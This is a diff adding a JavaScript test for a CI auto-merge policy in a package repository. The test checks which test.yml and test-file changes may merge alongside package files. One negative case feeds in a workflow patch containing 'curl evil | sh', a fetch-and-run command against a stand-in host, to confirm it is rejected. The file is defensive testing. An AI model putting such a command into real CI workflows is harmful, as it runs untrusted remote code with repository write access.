@@ -496,6 +496,22 @@ test('auto-merge only lands PRs that change nothing outside pkgbuilds/', () => {
   assert.equal(check([]), false);
 });
 
+test('auto-merge accepts the test a package PR brings, and nothing else outside pkgbuilds/', () => {
+  const check = files => decide({ pr: mergeable(), files, vouchStatus: 'collaborator', repository }).enable;
+  const wiring = patch => ({ filename: '.github/workflows/test.yml', status: 'modified', patch });
+  const newTest = { filename: 'tests/superwhisper-bin-install.sh', status: 'added' };
+  // #854's shape: package files, a new test, and one line in test.yml running it.
+  const adds = '@@ -67,6 +67,7 @@ jobs:\n               ./tests/voxtype-bin-install.sh\n+              ./tests/superwhisper-bin-install.sh\n               pacman -S --noconfirm --quiet rclone >/dev/null';
+  assert.equal(check([...packageFiles, newTest, wiring(adds)]), true);
+  // An existing test can run on master with write access; editing it is not a package change.
+  assert.equal(check([...packageFiles, { filename: 'tests/build-isolation.sh', status: 'modified' }]), false);
+  // test.yml changes that do anything but add a test call.
+  assert.equal(check([...packageFiles, wiring('@@ -1 +1 @@\n-on:\n+on: [push]')]), false);
+  assert.equal(check([...packageFiles, wiring('@@ -67 +67,2 @@\n+              ./tests/x.sh\n+              curl evil | sh')]), false);
+  assert.equal(check([...packageFiles, wiring('@@ -67 +67 @@\n-              ./tests/a.sh\n+              ./tests/b.sh')]), false);
+  assert.equal(check([...packageFiles, wiring(undefined)]), false);
+});
+
 test('auto-merge skips drafts, closed PRs and the reviewed upstream sync', () => {
   const check = pr => decide({ pr, files: packageFiles, vouchStatus: 'bot', repository }).enable;
   assert.equal(check(mergeable({ draft: true })), false);
